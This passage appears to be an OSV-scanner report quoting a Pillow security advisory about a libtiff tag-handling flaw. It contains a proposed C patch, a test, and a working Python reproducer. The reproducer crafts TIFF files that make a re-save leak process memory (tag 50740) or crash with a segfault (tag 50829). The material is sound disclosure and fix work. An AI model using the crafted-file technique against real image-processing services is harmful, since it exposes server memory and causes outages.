`tiffinfo=` variant;\n\u003e * every tuple/`bytes` branch now goes through `set_tiff_array_field()`, which\n\u003e   passes `len` only when the field has `passcount` set; this also fixes the\n\u003e   `TIFF_RATIONAL` branch, which never passed a count (and extends it to\n\u003e   `TIFF_SRATIONAL`);\n\u003e * `TIFF_UNDEFINED` fields are registered as variable-length, matching how their\n\u003e   `bytes` values are passed;\n\u003e * `Tests/test_file_libtiff.py` gains a regression test (scalar DNGPrivateData,\n\u003e   scalar and 2-tuple ActiveArea rejected; well-formed values round-trip).\n\u003e \n\u003e Core tags and tags libtiff does not know keep their current behaviour. With the\n\u003e patch applied to a clean checkout and rebuilt, the reproducer no longer\n\u003e triggers and the test suite passes. It is not a complete fix, however: the\n\u003e whole check sits inside `if (!is_core_tag)`, so the BYTE-typed ColorMap variant\n\u003e stays open. The PackBits RGB TIFF carrying `320 / BYTE / 4`, re-saved with a\n\u003e bare `save()`, no longer segfaults at this point but writes 1536 bytes —\n\u003e over-read from the 5-byte `bytes` object and two stale varargs, including 22\n\u003e live heap pointers — into the output ColorMap, which is still a disclosure.\n\u003e Before merging, it needs a guard that accepts `TIFFTAG_COLORMAP` only through\n\u003e the existing 768-tuple branch, never through the scalar or `bytes` branches,\n\u003e and ideally the same shape check for the other core tags libtiff special-cases\n\u003e in `_TIFFVSetField` (YCbCrSubsampling 530, TransferFunction 301,\n\u003e ReferenceBlackWhite 532).\n\u003e \n\u003e Narrower Python-side mitigations in `_save` close individual entry points but\n\u003e not the class, and are worth adding alongside the C-side check: drop tags\n\u003e with `TiffTags.lookup(tag).type is None` from `supplied_tags` (closes the `Image.open()→save()` path shown here but not\n\u003e `tiffinfo=` callers); remove `COLORMAP` from `supplied_tags` next to\n\u003e `EXIFIFD`/`SAMPLEFORMAT` and extend the `IPTC_NAA_CHUNK` BYTE/UNDEFINED type\n\u003e guard to `PHOTOSHOP_CHUNK` and `XMP`; add 318/319/529 to the blocklist next to\n\u003e `REFERENCEBLACKWHITE`; and have `_save` `ifd.tagtype.pop(tag, None)` before\n\u003e assigning its own ColorMap/BitsPerSample/ICCProfile/… values so a\n\u003e `tiffinfo=`-imported type cannot reshape them. The C-side check is the fix to\n\u003e rely on.\n\u003e \n\u003e ## The patch\n\u003e \n\u003e Pass TIFF tag values to libtiff according to its own field definition, and raise ValueError when they do not fit\n\u003e \n\u003e Applies to `src/encode.c` at the commit above. It passed the mechanical check — applied to a clean tree, rebuilt, the reproducer stopped firing — but a reviewer did not endorse it as the right fix.\n\u003e \n\u003e ```diff\n\u003e diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\n\u003e index 3d804ea4a..adc4633e4 100644\n\u003e --- a/Tests/test_file_libtiff.py\n\u003e +++ b/Tests/test_file_libtiff.py\n\u003e @@ -395,6 +395,43 @@ class TestFileLibTiff(LibTiffTestCase):\n\u003e          with pytest.raises(ValueError, match=\"Incorrect tag value type\"):\n\u003e              im.save(out, tiffinfo=ifd)\n\u003e  \n\u003e +    @pytest.mark.parametrize(\n\u003e +        \"tag, value\",\n\u003e +        (\n\u003e +            # DNGPrivateData is a BYTE array with a count to libtiff\n\u003e +            (50740, 4096),\n\u003e +            # ActiveArea is a LONG array of four values to libtiff\n\u003e +            (50829, 64),\n\u003e +            (50829, (0, 0)),\n\u003e +        ),\n\u003e +    )\n\u003e +    def test_libtiff_field_definition(\n\u003e +        self, tag: int, value: Any, monkeypatch: pytest.MonkeyPatch, tmp_path: Path\n\u003e +    ) -\u003e None:\n\u003e +        monkeypatch.setattr(TiffImagePlugin, \"WRITE_LIBTIFF\", True)\n\u003e +\n\u003e +        ifd = TiffImagePlugin.ImageFileDirectory_v2()\n\u003e +        ifd[tag] = value\n\u003e +        ifd.tagtype[tag] = TiffTags.LONG\n\u003e +\n\u003e +        out = tmp_path / \"temp.tif\"\n\u003e +        im = Image.new(\"L\", (1, 1))\n\u003e +        with pytest.raises(ValueError, match=\"libtiff field definition\"):\n\u003e +            im.save(out, tiffinfo=ifd)\n\u003e +\n\u003e +        # Values that match the libtiff definition are written\n\u003e +        ifd = TiffImagePlugin.ImageFileDirectory_v2()\n\u003e +        ifd[50740] = b\"private\"\n\u003e +        ifd.tagtype[50740] = TiffTags.BYTE\n\u003e +        ifd[50829] = (0, 0, 1, 1)\n\u003e +        ifd.tagtype[50829] = TiffTags.LONG\n\u003e +        im.save(out, tiffinfo=ifd)\n\u003e +\n\u003e +        with Image.open(out) as reloaded:\n\u003e +            assert isinstance(reloaded, TiffImagePlugin.TiffImageFile)\n\u003e +            assert reloaded.tag_v2[50740] == b\"private\"\n\u003e +            assert reloaded.tag_v2[50829] == (0, 0, 1, 1)\n\u003e +\n\u003e      def test_inknames_tag(\n\u003e          self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path\n\u003e      ) -\u003e None:\n\u003e diff --git a/src/encode.c b/src/encode.c\n\u003e index 9e19e9002..cbbd09f0d 100644\n\u003e --- a/src/encode.c\n\u003e +++ b/src/encode.c\n\u003e @@ -675,6 +675,106 @@ PyImaging_ZipEncoderNew(PyObject *self, PyObject *args) {\n\u003e  \n\u003e  #include \u003cstring.h\u003e\n\u003e  \n\u003e +/* C type that TIFFSetField reads from its arguments for a single value of\n\u003e +   the given type: int, uint64_t, double or char * */\n\u003e +static int\n\u003e +tiff_scalar_arg_type(TIFFDataType type) {\n\u003e +    switch (type) {\n\u003e +        case TIFF_BYTE:\n\u003e +        case TIFF_SBYTE:\n\u003e +        case TIFF_UNDEFINED:\n\u003e +        case TIFF_SHORT:\n\u003e +        case TIFF_SSHORT:\n\u003e +        case TIFF_LONG:\n\u003e +        case TIFF_SLONG:\n\u003e +        case TIFF_IFD:\n\u003e +            return 1;\n\u003e +        case TIFF_LONG8:\n\u003e +        case TIFF_SLONG8:\n\u003e +        case TIFF_IFD8:\n\u003e +            return 2;\n\u003e +        case TIFF_FLOAT:\n\u003e +        case TIFF_DOUBLE:\n\u003e +        case TIFF_RATIONAL:\n\u003e +        case TIFF_SRATIONAL:\n\u003e +            return 3;\n\u003e +        case TIFF_ASCII:\n\u003e +            return 4;\n\u003e +        default:\n\u003e +            return 0;\n\u003e +    }\n\u003e +}\n\u003e +\n\u003e +/* Size of the values that TIFFSetField copies from an array of the given\n\u003e +   type. libtiff stores custom RATIONAL arrays as floats. */\n\u003e +static int\n\u003e +tiff_array_item_size(TIFFDataType type) {\n\u003e +    switch (type) {\n\u003e +        case TIFF_BYTE:\n\u003e +        case TIFF_SBYTE:\n\u003e +        case TIFF_UNDEFINED:\n\u003e +        case TIFF_ASCII:\n\u003e +            return 1;\n\u003e +        case TIFF_SHORT:\n\u003e +        case TIFF_SSHORT:\n\u003e +            return 2;\n\u003e +        case TIFF_LONG:\n\u003e +        case TIFF_SLONG:\n\u003e +        case TIFF_IFD:\n\u003e +        case TIFF_FLOAT:\n\u003e +        case TIFF_RATIONAL:\n\u003e +        case TIFF_SRATIONAL:\n\u003e +            return 4;\n\u003e +        case TIFF_DOUBLE:\n\u003e +        case TIFF_LONG8:\n\u003e +        case TIFF_SLONG8:\n\u003e +        case TIFF_IFD8:\n\u003e +            return 8;\n\u003e +        default:\n\u003e +            return 0;\n\u003e +    }\n\u003e +}\n\u003e +\n\u003e +/* Check that a value which will be passed to TIFFSetField as a single value\n\u003e +   of the given type, or as an array of len values, matches the definition\n\u003e +   of the field that libtiff will use. */\n\u003e +static int\n\u003e +tiff_field_matches(\n\u003e +    TIFFDataType field_type,\n\u003e +    int passcount,\n\u003e +    int writecount,\n\u003e +    TIFFDataType type,\n\u003e +    int is_var_length,\n\u003e +    Py_ssize_t len\n\u003e +) {\n\u003e +    if (field_type == TIFF_ASCII \u0026\u0026 !passcount) {\n\u003e +        // TIFFSetField reads a null-terminated string\n\u003e +        return !is_var_length \u0026\u0026 type == TIFF_ASCII;\n\u003e +    }\n\u003e +    if (!is_var_length) {\n\u003e +        // TIFFSetField reads a single value\n\u003e +        return !passcount \u0026\u0026 writecount == 1 \u0026\u0026 tiff_scalar_arg_type(type) \u0026\u0026\n\u003e +               tiff_scalar_arg_type(type) == tiff_scalar_arg_type(field_type);\n\u003e +    }\n\u003e +    // TIFFSetField reads a pointer to the values, preceded by the number of\n\u003e +    // values if passcount is set. Otherwise, the number of values is fixed.\n\u003e +    if (!tiff_array_item_size(type) ||\n\u003e +        tiff_array_item_size(type) != tiff_array_item_size(field_type)) {\n\u003e +        return 0;\n\u003e +    }\n\u003e +    return passcount || (writecount \u003e 1 \u0026\u0026 len == writecount);\n\u003e +}\n\u003e +\n\u003e +static int\n\u003e +set_tiff_array_field(\n\u003e +    ImagingCodecState state, int key, int passcount, Py_ssize_t len, void *av\n\u003e +) {\n\u003e +    if (passcount) {\n\u003e +        return ImagingLibTiffSetField(state, (ttag_t)key, len, av);\n\u003e +    }\n\u003e +    return ImagingLibTiffSetField(state, (ttag_t)key, av);\n\u003e +}\n\u003e +\n\u003e  PyObject *\n\u003e  PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e      ImagingEncoderObject *encoder;\n\u003e @@ -689,7 +789,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e      PyObject *key, *value;\n\u003e      Py_ssize_t pos = 0;\n\u003e      int key_int, status, is_core_tag, is_var_length, num_core_tags, i;\n\u003e -    TIFFDataType type = TIFF_NOTYPE;\n\u003e +    int is_known_tag, passcount, writecount;\n\u003e +    TIFFDataType type = TIFF_NOTYPE, field_type;\n\u003e      // This list also exists in TiffTags.py\n\u003e      const int core_tags[] = {256, 257, 258,   259,   262,   263,   266,  269, 274, 277,\n\u003e                               278, 280, 281,   282,   283,   284,   286,  287, 296, 297,\n\u003e @@ -777,6 +878,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e          status = 0;\n\u003e          is_core_tag = 0;\n\u003e          is_var_length = 0;\n\u003e +        is_known_tag = 0;\n\u003e +        passcount = 1;\n\u003e          type = TIFF_NOTYPE;\n\u003e  \n\u003e          for (i = 0; i \u003c num_core_tags; i++) {\n\u003e @@ -800,6 +903,15 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                  }\n\u003e                  Py_DECREF(tag_type);\n\u003e              }\n\u003e +\n\u003e +            // libtiff uses its own definition for tags that it already knows,\n\u003e +            // rather than the field registered below.\n\u003e +            is_known_tag = ImagingLibTiffFindField(\n\u003e +                \u0026encoder-\u003estate, key_int, \u0026field_type, \u0026passcount, \u0026writecount\n\u003e +            );\n\u003e +            if (is_known_tag \u0026\u0026 type == TIFF_NOTYPE) {\n\u003e +                type = field_type;\n\u003e +            }\n\u003e          }\n\u003e  \n\u003e          if (type == TIFF_NOTYPE) {\n\u003e @@ -838,7 +950,7 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e  \n\u003e          if (!is_core_tag) {\n\u003e              // Register field for non core tags.\n\u003e -            if (type == TIFF_BYTE) {\n\u003e +            if (type == TIFF_BYTE || type == TIFF_UNDEFINED) {\n\u003e                  is_var_length = 1;\n\u003e              }\n\u003e              if (ImagingLibTiffMergeFieldInfo(\n\u003e @@ -847,6 +959,28 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                  Py_DECREF(item);\n\u003e                  continue;\n\u003e              }\n\u003e +\n\u003e +            if (is_known_tag) {\n\u003e +                // Check that the value will be passed to TIFFSetField in the\n\u003e +                // form that libtiff's definition of the tag expects.\n\u003e +                Py_ssize_t len = 0;\n\u003e +                if (PyTuple_Check(value)) {\n\u003e +                    len = PyTuple_Size(value);\n\u003e +                } else if (PyBytes_Check(value)) {\n\u003e +                    len = PyBytes_Size(value);\n\u003e +                }\n\u003e +                if (!tiff_field_matches(\n\u003e +                        field_type, passcount, writecount, type, is_var_length, len\n\u003e +                    )) {\n\u003e +                    Py_DECREF(encoder);\n\u003e +                    Py_DECREF(item);\n\u003e +                    PyErr_SetString(\n\u003e +                        PyExc_ValueError,\n\u003e +                        \"Tag value does not match libtiff field definition\"\n\u003e +                    );\n\u003e +                    return NULL;\n\u003e +                }\n\u003e +            }\n\u003e          }\n\u003e  \n\u003e          if (type == TIFF_BYTE || type == TIFF_UNDEFINED ||\n\u003e @@ -857,9 +991,10 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                  PyErr_SetString(PyExc_ValueError, \"Incorrect tag value type\");\n\u003e                  return NULL;\n\u003e              }\n\u003e -            status = ImagingLibTiffSetField(\n\u003e +            status = set_tiff_array_field(\n\u003e                  \u0026encoder-\u003estate,\n\u003e -                (ttag_t)key_int,\n\u003e +                key_int,\n\u003e +                passcount,\n\u003e                  PyBytes_Size(value),\n\u003e                  PyBytes_AsString(value)\n\u003e              );\n\u003e @@ -909,8 +1044,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (UINT16)PyLong_AsLong(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e @@ -922,8 +1057,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (UINT32)PyLong_AsLong(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e @@ -935,8 +1070,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (INT8)PyLong_AsLong(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e @@ -948,8 +1083,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (INT16)PyLong_AsLong(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e @@ -961,8 +1096,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (INT32)PyLong_AsLong(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e @@ -974,8 +1109,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (FLOAT32)PyFloat_AsDouble(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e @@ -987,12 +1122,12 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = PyFloat_AsDouble(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status = ImagingLibTiffSetField(\n\u003e -                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e                      );\n\u003e                      free(av);\n\u003e                  }\n\u003e -            } else if (type == TIFF_RATIONAL) {\n\u003e +            } else if (type == TIFF_RATIONAL || type == TIFF_SRATIONAL) {\n\u003e                  FLOAT32 *av;\n\u003e                  /* malloc check ok, calloc checks for overflow */\n\u003e                  av = calloc(len, sizeof(FLOAT32));\n\u003e @@ -1000,8 +1135,9 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n\u003e                      for (i = 0; i \u003c len; i++) {\n\u003e                          av[i] = (FLOAT32)PyFloat_AsDouble(PyTuple_GetItem(value, i));\n\u003e                      }\n\u003e -                    status =\n\u003e -                        ImagingLibTiffSetField(\u0026encoder-\u003estate, (ttag_t)key_int, av);\n\u003e +                    status = set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e +                    );\n\u003e                      free(av);\n\u003e                  }\n\u003e              }\n\u003e diff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\n\u003e index 8a57c523d..e14dd50bb 100644\n\u003e --- a/src/libImaging/TiffDecode.c\n\u003e +++ b/src/libImaging/TiffDecode.c\n\u003e @@ -923,6 +923,29 @@ ImagingLibTiffMergeFieldInfo(\n\u003e      return TIFFMergeFieldInfo(clientstate-\u003etiff, info, n);\n\u003e  }\n\u003e  \n\u003e +int\n\u003e +ImagingLibTiffFindField(\n\u003e +    ImagingCodecState state,\n\u003e +    int key,\n\u003e +    TIFFDataType *field_type,\n\u003e +    int *passcount,\n\u003e +    int *writecount\n\u003e +) {\n\u003e +    // Look up libtiff's own definition of a tag. TIFFMergeFieldInfo does not\n\u003e +    // replace the definition of a tag that libtiff already knows, so this is\n\u003e +    // what TIFFSetField will use for such tags.\n\u003e +    TIFFSTATE *clientstate = (TIFFSTATE *)state-\u003econtext;\n\u003e +    const TIFFField *fip = TIFFFindField(clientstate-\u003etiff, (ttag_t)key, TIFF_ANY);\n\u003e +\n\u003e +    if (!fip) {\n\u003e +        return 0;\n\u003e +    }\n\u003e +    *field_type = TIFFFieldDataType(fip);\n\u003e +    *passcount = TIFFFieldPassCount(fip);\n\u003e +    *writecount = TIFFFieldWriteCount(fip);\n\u003e +    return 1;\n\u003e +}\n\u003e +\n\u003e  int\n\u003e  ImagingLibTiffSetField(ImagingCodecState state, ttag_t tag, ...) {\n\u003e      // after tif_dir.c-\u003eTIFFSetField.\n\u003e diff --git a/src/libImaging/TiffDecode.h b/src/libImaging/TiffDecode.h\n\u003e index c31d0b9d8..ee1e4a5f9 100644\n\u003e --- a/src/libImaging/TiffDecode.h\n\u003e +++ b/src/libImaging/TiffDecode.h\n\u003e @@ -41,6 +41,14 @@ ImagingLibTiffMergeFieldInfo(\n\u003e      ImagingCodecState state, TIFFDataType field_type, int key, int is_var_length\n\u003e  );\n\u003e  extern int\n\u003e +ImagingLibTiffFindField(\n\u003e +    ImagingCodecState state,\n\u003e +    int key,\n\u003e +    TIFFDataType *field_type,\n\u003e +    int *passcount,\n\u003e +    int *writecount\n\u003e +);\n\u003e +extern int\n\u003e  ImagingLibTiffSetField(ImagingCodecState state, ttag_t tag, ...);\n\u003e  \n\u003e  /*\n\u003e ```\n\u003e \n\u003e ## The reproducer\n\u003e \n\u003e \u003cdetails\u003e\n\u003e \u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 2,545 bytes (click to open)\u003c/summary\u003e\n\u003e \n\u003e Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e # Pillow libtiff writer: a count-1 integer tag copied from the source TIFF is passed to\n\u003e # TIFFSetField() as one scalar vararg; for tags libtiff itself defines as arrays it is\n\u003e # consumed as a byte COUNT (DNGPrivateData 50740 -\u003e N bytes of process memory written\n\u003e # into the output) or as a POINTER (ActiveArea 50829 -\u003e SIGSEGV).  Application side is\n\u003e # the ordinary \"open upload, save as TIFF\" (compression is inherited -\u003e libtiff writer).\n\u003e import io, struct, subprocess, sys, resource\n\u003e from PIL import Image\n\u003e \n\u003e def upload(tag, value):\n\u003e     \"\"\"Pillow-written 16x16 LZW TIFF, plus one extra IFD entry \u003ctag\u003e LONG[1] = value.\"\"\"\n\u003e     b = io.BytesIO()\n\u003e     Image.new(\"RGB\", (16, 16), \"red\").save(b, \"TIFF\", compression=\"tiff_lzw\")\n\u003e     data = bytearray(b.getvalue()); assert data[:4] == b\"II*\\0\"\n\u003e     (off,) = struct.unpack_from(\"\u003cI\", data, 4)\n\u003e     (n,) = struct.unpack_from(\"\u003cH\", data, off)\n\u003e     ents = [bytes(data[off + 2 + 12 * i: off + 14 + 12 * i]) for i in range(n)]\n\u003e     ents.append(struct.pack(\"\u003cHHII\", tag, 4, 1, value))\n\u003e     ents.sort(key=lambda e: struct.unpack_from(\"\u003cH\", e)[0])\n\u003e     data += b\"\\0\" * (len(data) \u0026 1); new_off = len(data)\n\u003e     data += struct.pack(\"\u003cH\", len(ents)) + b\"\".join(ents) + struct.pack(\"\u003cI\", 0)\n\u003e     struct.pack_into(\"\u003cI\", data, 4, new_off)\n\u003e     return bytes(data)\n\u003e \n\u003e def resave(src):                       # the whole \"service\"\n\u003e     im = Image.open(io.BytesIO(src)); out = io.BytesIO(); im.save(out, \"TIFF\")\n\u003e     return out.getvalue()\n\u003e \n\u003e if len(sys.argv) \u003e 1 and sys.argv[1] == \"child\":\n\u003e     resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n\u003e     resave(upload(50829, 64)); sys.exit(0)\n\u003e \n\u003e print(\"PIL core:\", Image.core.__file__)\n\u003e ctl = Image.open(io.BytesIO(resave(upload(65000, 4096)))).tag_v2.get(65000)\n\u003e print(\"control  tag 65000=4096 -\u003e\", repr(ctl))\n\u003e \n\u003e N = 65536\n\u003e src = upload(50740, N)\n\u003e try:\n\u003e     v = Image.open(io.BytesIO(resave(src))).tag_v2.get(50740)\n\u003e except (ValueError, RuntimeError) as e:   # a fixed Pillow may reject the tag\n\u003e     v = e\n\u003e leak = isinstance(v, bytes) and len(v) == N and v[:64] not in src\n\u003e print(f\"leak     tag 50740={N} from a {len(src)}-byte upload -\u003e\",\n\u003e       f\"{len(v)} bytes not present in input, head {v[:32].hex()}\" if leak else repr(v)[:80])\n\u003e if leak:\n\u003e     so = open(Image.core.__file__, \"rb\").read()\n\u003e     print(\"         leaked bytes found in _imaging.so at file offset\", hex(so.find(v[:256])))\n\u003e \n\u003e rc = subprocess.call([sys.executable, __file__, \"child\"])\n\u003e crash = rc in (-11, 139)\n\u003e print(\"crash    tag 50829=64 -\u003e child exit\", rc, \"(SIGSEGV)\" if crash else \"\")\n\u003e print(\"BUG\" if leak or crash else \"OK\")\n\u003e ```\n\u003e \u003c/details\u003e\n\u003e \n\u003e ---\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-xvh5-g6gv-559v | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112902\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
